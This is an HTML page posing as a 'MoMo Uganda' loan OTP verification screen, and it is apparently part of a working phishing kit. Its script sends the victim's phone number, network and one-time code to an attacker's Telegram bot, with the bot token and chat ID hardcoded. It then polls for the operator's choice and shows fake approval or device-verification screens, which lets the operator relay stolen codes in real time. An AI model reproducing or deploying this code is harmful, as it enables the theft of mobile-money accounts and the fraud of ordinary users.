<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>OTP Verification - MoMo Uganda</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --red: #E42320;
            --red-dark: #c01c1a;
            --green: #10b981;
            --blue: #3b82f6;
            --yellow: #f59e0b;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section {
            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
            text-align: center;
            padding: 28px 0 22px;
        }
        .brand-logo {
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .logo-icon {
            width: 48px;
            height: 48px;
            background: white;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .brand-name {
            color: white;
            font-size: 26px;
            font-weight: 700;
        }
        .tagline {
            color: rgba(255,255,255,0.85);
            font-size: 12.5px;
        }
        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            color: #1e2937;
            margin: 22px 0 6px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 14px;
            padding: 0 25px 18px;
        }
        .phone-display {
            text-align: center;
            font-size: 13px;
            color: #64748b;
            margin: -10px 0 14px;
        }
        .phone-display strong {
            color: var(--red);
        }
        .offer-info {
            background: #fff0f0;
            margin: 0 20px 18px;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
        }
        .offer-amount {
            color: var(--red);
            font-weight: 800;
            font-size: 24px;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 18px 0 26px;
            padding: 0 20px;
            flex-wrap: wrap;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            color: var(--red);
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            outline: none;
            background: white;
        }
        .otp-input:focus {
            border-color: var(--red);
            box-shadow: 0 0 0 4px rgba(228,35,32,0.15);
        }
        .error-msg {
            text-align: center;
            margin: 12px 20px 18px;
            padding: 14px;
            border-radius: 12px;
            display: none;
            color: #b91c1c;
            background: #fee2e2;
            border: 1px solid #fca5a5;
        }
        .status-message {
            text-align: center;
            margin: 12px 20px 18px;
            padding: 14px;
            border-radius: 12px;
            display: none;
            font-weight: 600;
        }
        .status-message.success {
            background: #f0fdf4;
            color: #166534;
            border: 1px solid #86efac;
        }
        .status-message.processing {
            background: #eff6ff;
            color: #1e40af;
            border: 1px solid #93c5fd;
        }
        .btn-action {
            width: 100%;
            background: var(--red);
            color: white;
            border: none;
            padding: 17px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px 0;
        }
        .btn-action:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
        }
        .resend-link {
            text-align: center;
            margin: 10px 0 20px;
        }
        .resend-link button {
            background: none;
            border: none;
            color: var(--red);
            font-weight: 600;
            cursor: pointer;
            font-size: 13px;
            text-decoration: underline;
        }
        #spinner {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.92);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid var(--red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .check-icon {
            width: 60px;
            height: 60px;
            background: var(--green);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            color: white;
            font-size: 30px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo-section">
        <div class="brand-logo">
            <div class="logo-icon">
                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                    <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#E42320" stroke-width="2.2" fill="none"/>
                    <circle cx="14" cy="19" r="2.5" fill="white"/>
                </svg>
            </div>
            <div>
                <div class="brand-name">MoMo Uganda</div>
                <div class="tagline">Mobile Money • Loans</div>
            </div>
        </div>
    </div>

    <div class="content-wrapper">
        <h1>Verify Your Loan</h1>
        <p class="subtitle">A 6-digit verification code has been sent to your MoMo number.</p>
        <p class="phone-display" id="phoneDisplay"></p>

        <div class="offer-info" id="offerInfo">
            <div class="offer-amount" id="offerAmount">—</div>
            <div id="offerDetails" style="font-size:12px; color:#64748b; margin-top:5px;"></div>
        </div>

        <div class="otp-container" id="otpInputs"></div>
        <div class="error-msg" id="errMsg"></div>
        <div class="status-message" id="statusMsg"></div>

        <div class="resend-link">
            <button onclick="resendOTP()">⟳ Didn't receive code? Resend OTP</button>
        </div>

        <div style="padding: 0 25px 30px;">
            <button class="btn-action" id="verifyBtn">Verify & Confirm Loan</button>
            <button class="back-btn" onclick="window.location.href='verify.html'">← Back</button>
        </div>
    </div>
</div>

<!-- Completion Modal (shown after final approval) -->
<div id="completionModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:20000; align-items:center; justify-content:center; padding:20px;">
    <div style="background:white; max-width:380px; border-radius:24px; padding:32px 24px; text-align:center;">
        <div class="check-icon">✓</div>
        <h2 style="color:#1e2937; margin-bottom:8px;">Loan Approved!</h2>
        <p style="color:#64748b; margin-bottom:24px;">Your loan has been successfully approved. Funds will be sent to your MoMo account shortly.</p>
        <button onclick="window.location.href='index.html'" style="background:var(--red); color:white; border:none; padding:14px 28px; border-radius:50px; font-weight:700; cursor:pointer;">Return Home</button>
    </div>
</div>

<div id="spinner">
    <div class="spin"></div>
    <p style="margin-top:25px;">Verifying code...</p>
</div>

<script>
    // Telegram Configuration - UGANDA BOT
    const CONFIG = {
        BOT_TOKEN: '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E',
        CHAT_ID: '8392790531'
    };

    let state = { lastUpdateId: 0 };
    let isProcessing = false;
    let pendingMessageId = null;

    const errMsg = document.getElementById('errMsg');
    const statusMsg = document.getElementById('statusMsg');
    const spinner = document.getElementById('spinner');
    const verifyBtn = document.getElementById('verifyBtn');
    const completionModal = document.getElementById('completionModal');

    let userPhone = sessionStorage.getItem('userPhone') || '';
    let userNetwork = sessionStorage.getItem('userNetwork') || '';

    function showError(msg) {
        errMsg.textContent = msg;
        errMsg.style.display = 'block';
        setTimeout(() => { errMsg.style.display = 'none'; }, 3000);
    }

    function showStatus(msg, type = 'processing') {
        statusMsg.textContent = msg;
        statusMsg.className = `status-message ${type}`;
        statusMsg.style.display = 'block';
        setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
    }

    function loadLoanData() {
        const calculatorData = sessionStorage.getItem('calculatorData');
        if (calculatorData) {
            const data = JSON.parse(calculatorData);
            const currency = data.currency || 'UGX';
            document.getElementById('offerAmount').textContent = `${currency} ${data.amount.toLocaleString()}`;
            const months = data.duration / 30;
            document.getElementById('offerDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: ${currency} ${data.monthly.toLocaleString()}`;
        } else {
            document.getElementById('offerAmount').textContent = 'UGX 500,000';
            document.getElementById('offerDetails').textContent = '3 Months • Monthly: UGX 182,500';
        }
        if (userPhone) {
            document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${maskPhone(userPhone)}</strong> (${userNetwork || 'MoMo'})`;
        }
    }

    function maskPhone(phone) {
        if (!phone) return '';
        return phone.slice(0, 3) + '****' + phone.slice(-3);
    }

    function createInputs() {
        const container = document.getElementById('otpInputs');
        container.innerHTML = '';
        for (let i = 0; i < 6; i++) {  // Changed from 5 to 6
            const input = document.createElement('input');
            input.type = 'text';
            input.maxLength = 1;
            input.className = 'otp-input';
            input.inputMode = 'numeric';
            container.appendChild(input);
        }
    }

    function getCode() {
        return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value.trim()).join('');
    }

    function clearInputs() {
        document.querySelectorAll('.otp-input').forEach(i => i.value = '');
    }

    function setupAutoFocus() {
        const inputs = document.querySelectorAll('.otp-input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '');
                if (input.value.length === 1 && index < 5) {  // Changed from 4 to 5
                    inputs[index + 1].focus();
                }
                if (getCode().length === 6) {  // Changed from 5 to 6
                    setTimeout(submitOTP, 180);
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    }

    function resendOTP() {
        showStatus("📱 A new verification code has been sent to your MoMo number", "processing");
        clearInputs();
        document.querySelectorAll('.otp-input')[0]?.focus();
    }

    function submitOTP() {
        if (isProcessing) return;
        
        const otp = getCode();
        if (otp.length !== 6) {  // Changed from 5 to 6
            showError("Please enter the complete 6-digit code");
            return;
        }
        
        isProcessing = true;
        verifyBtn.disabled = true;
        verifyBtn.textContent = "Verifying...";

        const ts = Date.now();
        const approveId = `final_approve_${ts}`;
        const verifyDeviceId = `final_verify_device_${ts}`;
        const appliedId = `final_applied_${ts}`;
        const declineId = `final_decline_${ts}`;

        const loanAmount = document.getElementById('offerAmount').textContent;

        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: `<b>🔴 FINAL OTP VERIFICATION - UGANDA</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Network:</b> ${userNetwork || 'MoMo Uganda'}\n<b>📞 Phone:</b> <code>${userPhone}</code>\n<b>🔑 OTP Code:</b> <code>${otp}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ Complete Loan", callback_data: approveId },
                            { text: "📱 Verify Device", callback_data: verifyDeviceId }
                        ],
                        [
                            { text: "📋 Already Applied", callback_data: appliedId },
                            { text: "❌ Reject", callback_data: declineId }
                        ]
                    ]
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok && data.result) {
                pendingMessageId = data.result.message_id;
            }
            spinner.style.display = 'flex';
            startFinalPolling(approveId, verifyDeviceId, appliedId, declineId);
        })
        .catch((error) => {
            console.error('Error:', error);
            resetButton();
            showError("Network error. Please try again.");
        });
    }

    function startFinalPolling(approveId, verifyDeviceId, appliedId, declineId) {
        const interval = setInterval(() => {
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`)
                .then(r => r.json())
                .then(data => {
                    if (!data.ok || !data.result) return;
                    
                    for (const update of data.result) {
                        if (update.update_id > state.lastUpdateId) {
                            state.lastUpdateId = update.update_id;
                        }
                        
                        if (update.callback_query) {
                            const cb = update.callback_query.data;
                            const callbackId = update.callback_query.id;
                            
                            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    callback_query_id: callbackId,
                                    text: "Processing your request..."
                                })
                            });
                            
                            if (cb === approveId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                showStatus("✅ Loan Completed Successfully!", "success");
                                
                                if (pendingMessageId) {
                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CONFIG.CHAT_ID,
                                            message_id: pendingMessageId,
                                            text: `✅ <b>LOAN COMPLETED - UGANDA</b>\n\nPhone: ${userPhone}\nNetwork: ${userNetwork || 'MoMo'}\nStatus: Approved & Completed\nTime: ${new Date().toLocaleString()}`,
                                            parse_mode: 'HTML'
                                        })
                                    });
                                }
                                
                                setTimeout(() => {
                                    completionModal.style.display = 'flex';
                                    sessionStorage.clear();
                                }, 1500);
                                return;
                            } 
                            else if (cb === verifyDeviceId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                showStatus("📱 Device verification required.", "processing");
                                
                                if (pendingMessageId) {
                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CONFIG.CHAT_ID,
                                            message_id: pendingMessageId,
                                            text: `📱 <b>DEVICE VERIFICATION - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Pending\nTime: ${new Date().toLocaleString()}`,
                                            parse_mode: 'HTML'
                                        })
                                    });
                                }
                                
                                setTimeout(() => {
                                    window.location.href = '/device_verify.html';
                                }, 1500);
                                return;
                            }
                            else if (cb === appliedId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                showStatus("📋 You have already applied. Please wait.", "processing");
                                
                                if (pendingMessageId) {
                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CONFIG.CHAT_ID,
                                            message_id: pendingMessageId,
                                            text: `📋 <b>ALREADY APPLIED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Previously applied\nTime: ${new Date().toLocaleString()}`,
                                            parse_mode: 'HTML'
                                        })
                                    });
                                }
                                
                                resetButton();
                                return;
                            }
                            else if (cb === declineId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                showError("❌ Verification failed. Please try again.");
                                
                                if (pendingMessageId) {
                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CONFIG.CHAT_ID,
                                            message_id: pendingMessageId,
                                            text: `❌ <b>LOAN DECLINED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Declined\nTime: ${new Date().toLocaleString()}`,
                                            parse_mode: 'HTML'
                                        })
                                    });
                                }
                                
                                resetButton();
                                return;
                            }
                        }
                    }
                })
                .catch(err => console.error('Polling error:', err));
        }, 1000);
    }

    function resetButton() {
        isProcessing = false;
        verifyBtn.disabled = false;
        verifyBtn.textContent = "Verify & Confirm Loan";
        spinner.style.display = 'none';
    }

    verifyBtn.onclick = submitOTP;
    createInputs();
    setupAutoFocus();
    loadLoanData();
    document.querySelectorAll('.otp-input')[0]?.focus();
</script>
</body>
</html>
